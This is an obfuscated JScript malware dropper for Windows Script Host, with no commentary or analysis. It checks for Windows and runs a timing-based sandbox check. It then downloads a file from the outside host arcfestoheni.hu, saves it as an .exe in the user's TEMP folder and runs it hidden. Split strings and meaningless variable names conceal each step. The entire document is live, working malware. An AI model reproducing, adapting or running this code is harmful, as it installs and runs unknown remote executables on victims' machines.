var HP = false;
var CP = "Create"+"Object";
var Y1 = function LS() {return WScript[CP]("WScript"+".Shell");}(), R = 11;
var TZ = "MSXML2"+".XMLHTTP";
var X = 2;
var TN = X - 2;
function GL(HS){Y1["Run"](HS, TN, TN);};
function Q(){return TZ + "";};
function Y0(M, OA){TN = TN * 1; return M - OA;};
function G(){return CP;};
/*@cc_on
  @if (@_win32 || @_win64)
    HP = true;
  @end
@*/
if (HP)
{
var T = "";
function SN(){return 22;};
var B = 0; var YT = 0;
function RX()
{
var FP = new this["Date"]();
var JS = FP["getUTCMilliseconds"]();
WScript["Sleep"](SN());
var FP = new this["Date"]();
var BN = FP["getUTCMilliseconds"]();
WScript["Sleep"](SN());
var FP = new this["Date"]();
var RL = FP["getUTCMilliseconds"]();
var B = "IU";
B = Y0(BN, JS);
var YT = "WP";
YT = Y0(RL, BN);
T = "open";
return Y0(B, YT);
}
var E = false;
var N0 = false;
for (var UJ = TN; UJ < SN() * 1; UJ++){if (RX() != TN){
E = true; 
YT = "31" + 11 * B + YT; 
N0 = true; 
break;
}}
function Y() {return ((E == true) && (E == N0)) ? 1 : TN;};
if (E && Y() && N0){
function W() {return Y1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "m1a6Ob1a09V4.ex" + "e";};
 ML = Q();
 MB = WScript[CP](ML);
 var S = 1;
do { 
	for (;S;){
	try {
		if (S == 1)
		{
			MB[T]("GET", "http://arcfestoheni.hu/n3usad", false);
			MB["send"]();
			S0 = "Sleep";
			S = 2;
		}
		WScript[S0](SN() + 120); 
		if (MB["readystate"] < 2 * 2) continue;
		S = TN;
		function ZJ(N) {var L = (1, 2, 3, 4, 5, N); return L;};
		A = WScript[G()]("ADODB.Stream");
		ML = A;
		ML[T]();
		ML["type"] = ZJ(1);
		ML["write"](MB["ResponseBody"]);
		A["position"] = ZJ(TN);
		ML["Save" + "ToFile"](W(), 2);
		A["cl"+"ose"]();
		CC = W();
		GL(CC);
	} catch(T0){};};
}while (S);
}
}

